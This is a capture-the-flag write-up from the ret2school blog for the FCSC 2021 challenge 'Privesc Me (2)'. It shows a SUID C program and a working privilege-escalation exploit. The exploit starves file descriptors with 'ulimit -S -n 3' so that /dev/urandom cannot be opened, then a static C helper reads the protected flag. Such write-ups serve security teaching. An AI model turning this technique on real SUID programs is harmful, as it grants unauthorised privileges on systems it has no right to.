@@ -1,0 +1,254 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[FCSC 2021 - pwn] Privesc Me (2) - &#34;ALED&#34; - Your randomness checker // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.81.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[FCSC 2021 - pwn] Privesc Me (2) - &#34;ALED&#34; - Your randomness checker"/>
+<meta name="twitter:description" content="Privesc Me (2) - &ldquo;ALED&rdquo; - Your randomness checker (misc - 194 pts)  Le dernier stagiaire de l&rsquo;équipe nous a pondu un nouveau programme pour tester la robustesse des clés d&rsquo;authentification que notre administrateur système utilise. Son outil est disponible dans le dossier stage1. Le chef a poussé un soupir d&rsquo;agacement en voyant le code.
+ I found this one pretty fun and I think it was my favorite along with &ldquo;It&rsquo;s mipsy router&rdquo;."/>
+
+    <meta property="og:title" content="[FCSC 2021 - pwn] Privesc Me (2) - &#34;ALED&#34; - Your randomness checker" />
+<meta property="og:description" content="Privesc Me (2) - &ldquo;ALED&rdquo; - Your randomness checker (misc - 194 pts)  Le dernier stagiaire de l&rsquo;équipe nous a pondu un nouveau programme pour tester la robustesse des clés d&rsquo;authentification que notre administrateur système utilise. Son outil est disponible dans le dossier stage1. Le chef a poussé un soupir d&rsquo;agacement en voyant le code.
+ I found this one pretty fun and I think it was my favorite along with &ldquo;It&rsquo;s mipsy router&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/privesc_two/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-05-03T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-05-03T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[FCSC 2021 - pwn] Privesc Me (2) - &#34;ALED&#34; - Your randomness checker</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          May 3, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/ret2school/">ret2school</a>
+              <a class="tag" href="https://ret2school.github.io/tags/fcsc/">FCSC</a>
+              <a class="tag" href="https://ret2school.github.io/tags/0p/">0p</a>
+              <a class="tag" href="https://ret2school.github.io/tags/0poss/">0poss</a>
+              <a class="tag" href="https://ret2school.github.io/tags/2021/">2021</a>
+              <a class="tag" href="https://ret2school.github.io/tags/misc/">misc</a>
+              <a class="tag" href="https://ret2school.github.io/tags/privesc/">privesc</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="privesc-me-2---aled---your-randomness-checker-misc---194-pts">Privesc Me (2) - &ldquo;ALED&rdquo; - Your randomness checker (misc - 194 pts)</h1>
+<blockquote>
+<p>Le dernier stagiaire de l&rsquo;équipe nous a pondu un nouveau programme pour tester la robustesse des clés d&rsquo;authentification que notre administrateur système utilise. Son outil est disponible dans le dossier stage1. Le chef a poussé un soupir d&rsquo;agacement en voyant le code.</p>
+</blockquote>
+<p>I found this one pretty fun and I think it was my favorite along with &ldquo;It&rsquo;s mipsy router&rdquo;.</p>
+<p>Once connected to the ssh, into the <code>stage1</code> folder, there are four files, <code>build.sh</code>, <code>flag.txt</code> (I wonder what that is), <code>stage1</code> (a SUID binary) and its source in <code>stage1.c</code>, here it is :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/types.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/stat.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#define BUF_SIZE 128
+</span><span style="color:#ff79c6"></span>
+<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">*</span>argv[]) {
+
+    <span style="color:#ff79c6">if</span>(argc <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">3</span>){
+        printf(<span style="color:#f1fa8c">&#34;Usage : %s &lt;key file&gt; &lt;binary to execute&gt;&#34;</span>, argv[<span style="color:#bd93f9">0</span>]);
+    }
+    setresgid(getegid(), getegid(), getegid());
+
+    <span style="color:#8be9fd">int</span> fd;
+    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> randomness[BUF_SIZE];
+    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> your_randomness[BUF_SIZE];
+    memset(randomness, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+    memset(your_randomness, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+
+    <span style="color:#8be9fd">int</span> fd_key <span style="color:#ff79c6">=</span> open(argv[<span style="color:#bd93f9">1</span>], O_RDONLY, <span style="color:#bd93f9">0400</span>);
+    read(fd_key, your_randomness, BUF_SIZE);
+
+    fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/dev/urandom&#34;</span>, O_RDONLY, <span style="color:#bd93f9">0400</span>);
+    <span style="color:#8be9fd">int</span> nb_bytes <span style="color:#ff79c6">=</span> read(fd, randomness, BUF_SIZE);
+    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> nb_bytes; i<span style="color:#ff79c6">++</span>) {
+        randomness[i] <span style="color:#ff79c6">=</span> (randomness[i] <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x20</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">0x7F</span>;
+    }
+
+    <span style="color:#ff79c6">for</span>(<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> BUF_SIZE; i<span style="color:#ff79c6">++</span>){
+        <span style="color:#ff79c6">if</span>(randomness[i] <span style="color:#ff79c6">!=</span> your_randomness[i]) {
+            puts(<span style="color:#f1fa8c">&#34;Meh, you failed&#34;</span>);
+            <span style="color:#ff79c6">return</span> EXIT_FAILURE;
+        }
+    }
+    close(fd);
+    puts(<span style="color:#f1fa8c">&#34;Ok, well done&#34;</span>);
+    <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span> arg[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> {argv[<span style="color:#bd93f9">2</span>], <span style="color:#8be9fd;font-style:italic">NULL</span>};
+    execve(argv[<span style="color:#bd93f9">2</span>], arg, <span style="color:#8be9fd;font-style:italic">NULL</span>);
+    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+}
+</code></pre></div><p>It initializes two 128 bytes-long arrays with zeros and compares them. If they are the same, we get to execute any program we want&hellip; maybe <code>sh</code> ?</p>
+<p>The <code>build.sh</code> file contains <code>gcc stage1.c -static -o stage1</code>. I guess the <code>-static</code> is here to prevent any <code>LD_PRELOAD</code>, that would be to easy. But this option gave me the idea for the exploit.</p>
+<p>By googling things like &ldquo;predict /dev/urandom ctf writeup&rdquo; I found several <a href="https://nickcano.com/pwnables-write-ups-oct17/">writeup</a>s on several similar challenges that were using <code>ulimit -f 0</code> in order to limit &ldquo;the maximum size of files created by the shell&rdquo; (- man). But the program here doesn&rsquo;t create any file to write the random content to it, but just reads from <code>/dev/urandom</code>. So we have to prevent it from reading from <code>urandom</code> to keep the <code>randomness</code> array filled with zeros. The <code>-n</code> option in the <code>ulimit</code> command allows to set a limit on the number of opened file descriptors.
+I modified the original source on my system to make it print when the file openings fail and where the comparaison fails :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">*</span>argv[]) {
+
+    <span style="color:#ff79c6">if</span>(argc <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">3</span>){
+        printf(<span style="color:#f1fa8c">&#34;Usage : %s &lt;key file&gt; &lt;binary to execute&gt;&#34;</span>, argv[<span style="color:#bd93f9">0</span>]);
+    }
+    setresgid(getegid(), getegid(), getegid());
+
+    <span style="color:#8be9fd">int</span> fd;
+    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> randomness[BUF_SIZE];
+    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> your_randomness[BUF_SIZE];
+    memset(randomness, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+    memset(your_randomness, <span style="color:#bd93f9">0</span>, BUF_SIZE);
+
+    <span style="color:#8be9fd">int</span> fd_key <span style="color:#ff79c6">=</span> open(argv[<span style="color:#bd93f9">1</span>], O_RDONLY, <span style="color:#bd93f9">0400</span>);
+    read(fd_key, your_randomness, BUF_SIZE);
+    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> fd_key)
+	    puts(<span style="color:#f1fa8c">&#34;key open failed&#34;</span>);
+
+    fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/dev/urandom&#34;</span>, O_RDONLY, <span style="color:#bd93f9">0400</span>);
+    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> fd)
+	    puts(<span style="color:#f1fa8c">&#34;/dev/urandom open failed&#34;</span>);
+
+    <span style="color:#8be9fd">int</span> nb_bytes <span style="color:#ff79c6">=</span> read(fd, randomness, BUF_SIZE);
+    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> nb_bytes; i<span style="color:#ff79c6">++</span>) {
+        randomness[i] <span style="color:#ff79c6">=</span> (randomness[i] <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x20</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">0x7F</span>;
+    }
+
+    printf(<span style="color:#f1fa8c">&#34;%128s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, randomness);
+    printf(<span style="color:#f1fa8c">&#34;%128s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, your_randomness);
+    <span style="color:#ff79c6">for</span>(<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> BUF_SIZE; i<span style="color:#ff79c6">++</span>){
+        <span style="color:#ff79c6">if</span>(randomness[i] <span style="color:#ff79c6">!=</span> your_randomness[i]) {
+	    printf(<span style="color:#f1fa8c">&#34;%#x : (%#x != %#x)&#34;</span>, i, randomness[i], your_randomness[i]);
+            puts(<span style="color:#f1fa8c">&#34;Meh, you failed&#34;</span>);
+            <span style="color:#ff79c6">return</span> EXIT_FAILURE;
+        }
+    }
+    close(fd);
+    puts(<span style="color:#f1fa8c">&#34;Ok, well done&#34;</span>);
+    <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span> arg[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> {argv[<span style="color:#bd93f9">2</span>], <span style="color:#8be9fd;font-style:italic">NULL</span>};
+    execve(argv[<span style="color:#bd93f9">2</span>], arg, <span style="color:#8be9fd;font-style:italic">NULL</span>);
+    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+}
+</code></pre></div><p>Compile it with <code>gcc stage1.c -static -o stage1</code>.</p>
+<p>By running <code>ulimit -n 3 ; ./stage1 osef /bin/sh</code> locally, we get :</p>
+<pre><code>bash: start_pipeline : pgrp pipe: Trop de fichiers ouverts
+key open failed
+/dev/urandom open failed                                                                                           
+Ok, well done
+/bin/sh: error while loading shared libraries: libc.so.6: cannot open shared object file: Error 24
+</code></pre><p>It says &ldquo;Ok, well done&rdquo; (nice) but also <code>/bin/sh: error while loading shared libraries: libc.so.6: cannot open shared object file: Error 24</code>. Yeah obviously, <code>sh</code> is cannot load any dynlib since it already has 3 file descriptors open (stdin, stdout and stderr). So either we recompile <code>/bin/sh</code> statically, which I didn&rsquo;t do, or we just make another program, statically linked, to read the flag for us. Here it is :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/resource.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6"></span>
+<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+	<span style="color:#ff79c6">struct</span> rlimit lim <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span> };
+	<span style="color:#ff79c6">if</span> (<span style="color:#bd93f9">0</span> <span style="color:#ff79c6">!=</span> getrlimit(RLIMIT_NOFILE, <span style="color:#ff79c6">&amp;</span>lim))
+	{
+		puts(<span style="color:#f1fa8c">&#34;Meh&#34;</span>);
+		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>;
+	}
+	printf(<span style="color:#f1fa8c">&#34;Hard/soft limits : %ld/%ld</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, lim.rlim_cur, lim.rlim_max);
+
+	lim.rlim_cur <span style="color:#ff79c6">=</span> lim.rlim_max;
+	<span style="color:#ff79c6">if</span> (<span style="color:#bd93f9">0</span> <span style="color:#ff79c6">!=</span> setrlimit(RLIMIT_NOFILE, <span style="color:#ff79c6">&amp;</span>lim))
+	{
+		puts(<span style="color:#f1fa8c">&#34;w00t&#34;</span>);
+		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">2</span>;
+	}
+
+	<span style="color:#ff79c6">if</span> (<span style="color:#bd93f9">0</span> <span style="color:#ff79c6">!=</span> getrlimit(RLIMIT_NOFILE, <span style="color:#ff79c6">&amp;</span>lim))
+	{
+		puts(<span style="color:#f1fa8c">&#34;Meh&#34;</span>);
+		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">3</span>;
+	}
+	printf(<span style="color:#f1fa8c">&#34;Hard/soft limits : %ld/%ld</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, lim.rlim_cur, lim.rlim_max);
+
+	<span style="color:#8be9fd">char</span> flag_buf[<span style="color:#bd93f9">256</span>] <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span> };
+	<span style="color:#8be9fd">int</span> fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/home/challenger/stage1/flag.txt&#34;</span>, O_RDONLY);
+	<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> fd)
+	{
+		puts(<span style="color:#f1fa8c">&#34;Phuck&#34;</span>);
+		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">4</span>;
+	}
+
+	<span style="color:#8be9fd">int</span> red <span style="color:#ff79c6">=</span> read(fd, flag_buf, <span style="color:#ff79c6">sizeof</span>(flag_buf));
+	printf(<span style="color:#f1fa8c">&#34;%d bytes read : %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, red, flag_buf);
+
+	<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+}
+</code></pre></div><p>It sets the soft limit of opened file descriptors to the maximum, that&rsquo;s why we need to use <code>-S</code> in the final exploit to set the soft limit instead of the default hard limit (which we can&rsquo;t increase afterwards).
+I compile this remotly and&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#8be9fd;font-style:italic">ulimit</span> -S -n <span style="color:#bd93f9">3</span> ; ./stage1 osef /tmp/yEyyy/exploit
+-bash: start_pipeline: pgrp pipe: Too many open files
+Ok, well <span style="color:#ff79c6">done</span>
+Hard/soft limits : 3/1048576
+Hard/soft limits : 1048576/1048576
+<span style="color:#bd93f9">70</span> bytes <span style="color:#8be9fd;font-style:italic">read</span> : FCSC<span style="color:#ff79c6">{</span>6bd1152e8dcefc368b08a3e82241bc83ea7a613a3322c6a2d818d408e1fb4d60<span style="color:#ff79c6">}</span>
+</code></pre></div><p>Yay.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
